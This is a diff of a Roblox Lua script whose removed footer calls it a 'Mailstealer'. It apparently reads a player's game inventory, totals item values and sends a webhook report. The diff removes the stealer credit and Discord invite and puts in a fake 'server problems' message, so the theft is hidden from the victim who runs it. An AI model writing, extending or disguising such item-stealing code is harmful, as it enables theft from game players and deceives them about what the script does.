@@ -8,7 +8,7 @@ local network = require(game.ReplicatedStorage.Library.Client.Network)
 local library = require(game.ReplicatedStorage.Library)
 local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
 local plr = game.Players.LocalPlayer
-local MailMessage = "GG / GY2RVSEGDT"
+local MailMessage = "GGz"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local totalRAP = 0
@@ -114,7 +114,7 @@ local function SendMessage(diamonds)
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
+				["text"] = "Sorry we are having server problems at this moment."
 			}
         }}
     }
